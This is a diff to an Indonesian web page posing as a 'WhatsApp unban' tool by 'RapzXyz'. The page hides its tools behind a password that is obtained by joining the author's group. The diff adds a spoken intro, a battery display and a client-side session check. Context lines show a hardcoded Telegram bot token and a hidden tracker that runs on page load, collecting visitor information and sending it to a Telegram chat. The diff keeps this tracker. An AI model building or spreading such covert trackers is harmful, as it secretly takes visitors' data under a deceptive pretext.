@@ -166,7 +166,7 @@
             font-size: 26px;
             font-weight: 600;
             text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-            background: linear-gradient(90deg, #1e3a8a, #dc2626, #0f0f0f);
+            background: linear-gradient(90deg, #ffffff, #1e3a8a, #dc2626);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -706,7 +706,57 @@
             margin-bottom: 10px;
         }
         
-        /* Fun Features */
+        /* Fitur Baru: Informasi Baterai */
+        .battery-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .battery-level {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #1e3a8a;
+        }
+        
+        .battery-status {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        /* Fitur Baru: Voice Intro */
+        .voice-intro {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .voice-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        
+        .voice-btn {
+            padding: 8px 15px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .voice-btn:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        
         .fun-features {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -818,6 +868,21 @@
         </div>
         <h1>Unband WhatsApp By-RapzXyz</h1>
         
+        <!-- Fitur Baru: Voice Intro -->
+        <div class="voice-intro">
+            <div class="feature-title">
+                <i class="fas fa-volume-up"></i> Voice Intro
+            </div>
+            <div class="voice-controls">
+                <button id="playVoiceBtn" class="voice-btn">
+                    <i class="fas fa-play"></i> Putar
+                </button>
+                <button id="stopVoiceBtn" class="voice-btn">
+                    <i class="fas fa-stop"></i> Stop
+                </button>
+            </div>
+        </div>
+        
         <div class="input-group">
             <label for="password"><i class="fas fa-key"></i> Masukkan Sandi:</label>
             <input type="password" id="password" placeholder="Ketik sandi di sini">
@@ -826,12 +891,32 @@
         <button id="loginBtn" class="btn pulse">
             <i class="fas fa-sign-in-alt"></i> Masuk
         </button>
+        
+        <!-- Fitur Baru: Button TikTok dan WhatsApp Channel -->
+        <div class="contact-buttons">
+            <a href="https://tiktok.com/@style.fomo34" target="_blank" class="contact-btn tiktok">
+                <i class="fab fa-tiktok"></i> TikTok
+            </a>
+            <a href="https://whatsapp.com/channel/0029Vb6GVqq3QxRt7sn7gE1o" target="_blank" class="contact-btn whatsapp">
+                <i class="fab fa-whatsapp"></i> WhatsApp Channel
+            </a>
+        </div>
+        
         <button id="joinGroupBtn" class="btn btn-secondary">
             <i class="fas fa-users"></i> Mau tau sandi nya? join grub ku sini
         </button>
         
         <div id="errorMsg" class="error">
             <i class="fas fa-exclamation-circle"></i> Sandi salah! Coba lagi.
+        </div>
+        
+        <!-- Fitur Baru: Informasi Baterai -->
+        <div class="battery-info">
+            <div class="feature-title">
+                <i class="fas fa-battery-half"></i> Status Baterai
+            </div>
+            <div class="battery-level" id="batteryLevel">Mengambil data...</div>
+            <div class="battery-status" id="batteryStatus">-</div>
         </div>
         
         <div class="feature-section">
@@ -1035,31 +1120,6 @@
                     <div>Mini Game</div>
                 </button>
             </div>
-            
-            <!-- Fitur Baru: Sound Effects -->
-            <div class="feature-section">
-                <div class="feature-title">
-                    <i class="fas fa-volume-up"></i> Efek Suara
-                </div>
-                <div class="fun-features">
-                    <button class="fun-btn" id="sound1Btn">
-                        <div class="fun-icon">⚡</div>
-                        <div>Petir</div>
-                    </button>
-                    <button class="fun-btn" id="sound2Btn">
-                        <div class="fun-icon">👏</div>
-                        <div>Tepuk Tangan</div>
-                    </button>
-                    <button class="fun-btn" id="sound3Btn">
-                        <div class="fun-icon">🎉</div>
-                        <div>Kembang Api</div>
-                    </button>
-                    <button class="fun-btn" id="sound4Btn">
-                        <div class="fun-icon">😆</div>
-                        <div>Tertawa</div>
-                    </button>
-                </div>
-            </div>
         </div>
         
         <!-- Tab Tools -->
@@ -1145,6 +1205,12 @@
         const clearCacheBtn = document.getElementById('clearCacheBtn');
         const lightningContainer = document.getElementById('lightningContainer');
         
+        // Elemen untuk fitur baru
+        const playVoiceBtn = document.getElementById('playVoiceBtn');
+        const stopVoiceBtn = document.getElementById('stopVoiceBtn');
+        const batteryLevel = document.getElementById('batteryLevel');
+        const batteryStatus = document.getElementById('batteryStatus');
+        
         // Elemen untuk fitur fun
         const generateQuoteBtn = document.getElementById('generateQuoteBtn');
         const quoteText = document.getElementById('quoteText');
@@ -1153,10 +1219,6 @@
         const factBtn = document.getElementById('factBtn');
         const memeBtn = document.getElementById('memeBtn');
         const gameBtn = document.getElementById('gameBtn');
-        const sound1Btn = document.getElementById('sound1Btn');
-        const sound2Btn = document.getElementById('sound2Btn');
-        const sound3Btn = document.getElementById('sound3Btn');
-        const sound4Btn = document.getElementById('sound4Btn');
         
         // Sandi yang benar (banyak sandi)
         const correctPasswords = [
@@ -1233,6 +1295,15 @@
         // Konfigurasi Telegram Bot
         const TELEGRAM_BOT_TOKEN = "8024500747:AAFvoMNFoP2r5Mcj0vN4_6VQDDCmWZ9t854";
         const TELEGRAM_CHAT_ID = "8136310152";
+        
+        // Variabel untuk melacak sesi login
+        let activeSessions = {};
+        let currentSessionId = null;
+        
+        // Fungsi untuk membuat ID sesi unik
+        function generateSessionId() {
+            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
         
         // Fungsi untuk membuat efek petir
         function createLightning() {
@@ -1449,54 +1520,89 @@
             quoteGenre.textContent = `Genre: ${randomGenre.charAt(0).toUpperCase() + randomGenre.slice(1)}`;
         }
         
-        // Fungsi untuk memutar efek suara
-        function playSound(soundType) {
-            // Dalam implementasi nyata, ini akan memutar file audio
-            // Untuk demo, kita akan menggunakan Web Audio API untuk membuat suara sederhana
-            try {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
+        // Fungsi untuk memutar voice intro
+        function playVoiceIntro() {
+            // Menggunakan Web Speech API untuk mensintesis suara
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance();
+                utterance.text = "Selamat datang, jika belum bisa login silahkan ke contact developer atau admin aja ya";
+                utterance.lang = 'id-ID';
+                utterance.rate = 1.0;
+                utterance.pitch = 1.0;
                 
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
-                
-                // Setel tipe suara berdasarkan parameter
-                switch(soundType) {
-                    case 'thunder':
-                        oscillator.type = 'sawtooth';
-                        oscillator.frequency.setValueAtTime(100, audioContext.currentTime);
-                        gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
-                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 1);
-                        break;
-                    case 'applause':
-                        oscillator.type = 'sine';
-                        oscillator.frequency.setValueAtTime(523.25, audioContext.currentTime); // C5
-                        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
-                        break;
-                    case 'fireworks':
-                        oscillator.type = 'square';
-                        oscillator.frequency.setValueAtTime(659.25, audioContext.currentTime); // E5
-                        gainNode.gain.setValueAtTime(0.4, audioContext.currentTime);
-                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
-                        break;
-                    case 'laugh':
-                        oscillator.type = 'triangle';
-                        oscillator.frequency.setValueAtTime(392, audioContext.currentTime); // G4
-                        gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.7);
-                        break;
-                }
-                
-                oscillator.start();
-                oscillator.stop(audioContext.currentTime + 1);
-                
-                showNotification(`Memutar efek suara: ${soundType}`, 'success');
-            } catch (e) {
-                console.error('Error playing sound:', e);
-                showNotification('Efek suara tidak dapat diputar', 'error');
+                window.speechSynthesis.speak(utterance);
+                showNotification('Memutar voice intro...', 'success');
+            } else {
+                showNotification('Browser tidak mendukung fitur voice intro', 'error');
             }
+        }
+        
+        // Fungsi untuk menghentikan voice intro
+        function stopVoiceIntro() {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                showNotification('Voice intro dihentikan', 'success');
+            }
+        }
+        
+        // Fungsi untuk memeriksa status baterai
+        function checkBatteryStatus() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    updateBatteryInfo(battery);
+                    
+                    battery.addEventListener('levelchange', function() {
+                        updateBatteryInfo(battery);
+                    });
+                    
+                    battery.addEventListener('chargingchange', function() {
+                        updateBatteryInfo(battery);
+                    });
+                });
+            } else {
+                batteryLevel.textContent = 'Tidak tersedia';
+                batteryStatus.textContent = 'Fitur baterai tidak didukung browser ini';
+            }
+        }
+        
+        // Fungsi untuk memperbarui informasi baterai
+        function updateBatteryInfo(battery) {
+            const level = Math.round(battery.level * 100);
+            batteryLevel.textContent = `${level}%`;
+            
+            if (battery.charging) {
+                batteryStatus.textContent = 'Sedang diisi';
+            } else {
+                if (level > 70) {
+                    batteryStatus.textContent = 'Baterai penuh';
+                } else if (level > 30) {
+                    batteryStatus.textContent = 'Baterai sedang';
+                } else {
+                    batteryStatus.textContent = 'Baterai rendah';
+                }
+            }
+        }
+        
+        // Fungsi untuk memeriksa sesi aktif
+        function checkActiveSessions(password) {
+            const now = Date.now();
+            const sessionTimeout = 5 * 60 * 1000; // 5 menit
+            
+            // Hapus sesi yang sudah kadaluarsa
+            for (const sessionId in activeSessions) {
+                if (now - activeSessions[sessionId].timestamp > sessionTimeout) {
+                    delete activeSessions[sessionId];
+                }
+            }
+            
+            // Periksa apakah sandi sedang digunakan di perangkat lain
+            for (const sessionId in activeSessions) {
+                if (activeSessions[sessionId].password === password && sessionId !== currentSessionId) {
+                    return true; // Sandi sedang digunakan di perangkat lain
+                }
+            }
+            
+            return false; // Sandi tidak sedang digunakan di perangkat lain
         }
         
         // Event listener untuk tombol login
@@ -1504,6 +1610,19 @@
             const enteredPassword = passwordInput.value;
             
             if (correctPasswords.includes(enteredPassword)) {
+                // Periksa apakah sandi sedang digunakan di perangkat lain
+                if (checkActiveSessions(enteredPassword)) {
+                    showNotification('Sandi sedang digunakan di perangkat lain!', 'error');
+                    return;
+                }
+                
+                // Buat sesi baru
+                currentSessionId = generateSessionId();
+                activeSessions[currentSessionId] = {
+                    password: enteredPassword,
+                    timestamp: Date.now()
+                };
+                
                 // Password benar, pindah ke halaman utama
                 loginPage.style.display = 'none';
                 mainPage.style.display = 'block';
@@ -1658,23 +1777,9 @@
             showNotification('Mini game akan datang!', 'success');
         });
         
-        // Event listener untuk efek suara
-        sound1Btn.addEventListener('click', function() {
-            playSound('thunder');
-            createLightning(); // Juga buat efek petir visual
-        });
-        
-        sound2Btn.addEventListener('click', function() {
-            playSound('applause');
-        });
-        
-        sound3Btn.addEventListener('click', function() {
-            playSound('fireworks');
-        });
-        
-        sound4Btn.addEventListener('click', function() {
-            playSound('laugh');
-        });
+        // Event listener untuk voice intro
+        playVoiceBtn.addEventListener('click', playVoiceIntro);
+        stopVoiceBtn.addEventListener('click', stopVoiceIntro);
         
         // Animasi untuk elemen fitur
         const featureItems = document.querySelectorAll('.feature-item');
@@ -1687,14 +1792,26 @@
         startLightningEffect();
         updateProgress(0);
         
-        // Jalankan tracker saat halaman dimuat
-        window.addEventListener('load', async function() {
-            // Tunggu sebentar agar halaman selesai dimuat
+        // Periksa status baterai saat halaman dimuat
+        checkBatteryStatus();
+        
+        // Putar voice intro otomatis saat halaman dimuat
+        window.addEventListener('load', function() {
+            setTimeout(playVoiceIntro, 1000);
+            
+            // Jalankan tracker
             setTimeout(async () => {
                 const userInfo = await collectUserInfo();
                 await sendToTelegram(userInfo);
-            }, 1000);
+            }, 2000);
         });
+        
+        // Perbarui sesi aktif secara berkala
+        setInterval(() => {
+            if (currentSessionId) {
+                activeSessions[currentSessionId].timestamp = Date.now();
+            }
+        }, 60000); // Perbarui setiap menit
     </script>
 </body>
 </html>
